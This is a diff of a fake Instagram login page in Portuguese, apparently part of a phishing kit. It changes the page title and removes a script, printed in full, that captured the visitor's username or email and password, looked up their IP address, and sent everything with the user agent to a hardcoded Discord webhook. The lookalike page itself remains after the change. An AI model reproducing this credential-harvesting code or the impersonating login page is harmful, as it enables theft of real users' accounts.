@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="./styles.css" />
     <link rel="icon" type="image/png" href="./img/insta-fav.ico">
-    <title>Instagram clone</title>
+    <title>Instagram Reels</title>
 </head>
 <body>
     <main class="flex align-items-center justify-content-center">
@@ -13,8 +13,8 @@
         </section>
         <section id="auth" class="flex direction-column">
             <div class="panel login flex direction-column">
-                <h1 title="Instagram" class="flex justify-content-center">
-                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+                <h1 title="Instagram Reels" class="flex justify-content-center">
+                    <img src="./img//instagram-logo.png" alt="Instagram Reels logo" title="Instagram Reels" />
                 </h1>
                 <form id="loginForm">
                     <label for="email" class="sr-only">Telefone, nome de usuário ou e-mail</label>
@@ -70,35 +70,8 @@
         <p class="copyright">© 2020 Instagram do Facebook</p>
     </footer>
     <script>
-        history.pushState(null, '', '/login');
-        
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1480366266064830564/oxdF4Ed6DsE8AD7894wsBLZEVgXg0BqQKoJO3MDp1IlrsRcr6xQ5XmizwT1vUPko3Ubv';
-        
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            
-            const label = email.includes('@') ? 'Email' : /^[0-9+\s()-]+$/.test(email) ? 'Telefone' : 'Usuário';
-            
-            let location = 'Detectando...';
-            let ip = 'N/A';
-            
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                ip = data.ip;
-                location = `IP: ${ip}`;
-            } catch(e) {}
-            
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `**Login Attempt**\n${label}: ${email}\nPassword: ${password}\nIP: ${ip}\nUser-Agent: ${navigator.userAgent}`
-                })
-            });
-            
             document.getElementById('errorMsg').style.display = 'block';
         });
     </script>
